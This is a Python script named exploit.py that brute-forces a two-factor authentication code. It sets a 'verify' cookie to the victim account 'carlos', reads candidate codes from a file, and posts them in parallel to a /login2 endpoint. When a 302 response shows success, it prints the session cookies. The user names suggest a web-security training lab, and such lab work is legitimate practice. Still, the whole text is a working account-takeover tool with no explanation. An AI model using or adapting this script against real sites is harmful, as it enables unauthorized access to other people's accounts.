import requests
import sys
from concurrent.futures import ThreadPoolExecutor, as_completed


if (len(sys.argv) != 2):
    print("USAGE: exploit.py <url>")
    sys.exit(1)

url = sys.argv[1]
attacker = "wiener"
victim = "carlos"

def post_req(url, headers, data,i):
    print("i am in {0}".format(i),end="\r",flush=True)
    p = requests.post(url+'login2', headers=headers, data=data,  allow_redirects= False )
    return p
r = requests.get(url)
cookie_value = r.cookies['session']


#print(cookie_value)
file1 = open('creds/otp_pay','r')
opts = file1.readlines()


processes = []
i = 1
with ThreadPoolExecutor(max_workers=10) as executor:
    for opt in opts:
        print("{}".format(i),end="\r",flush=True)
        i = i + 1
        headers = {'Cookie' : 'session='+ cookie_value+'; verify='+victim}
        data = {'mfa-code' : opt}
        processes.append(executor.submit(post_req,url,headers,data,i))
i = 1
for task in as_completed(processes):
    print(i)
    if task.result().status_code == 302:
        print(task.result().cookies)
    i = i + 1
    


    

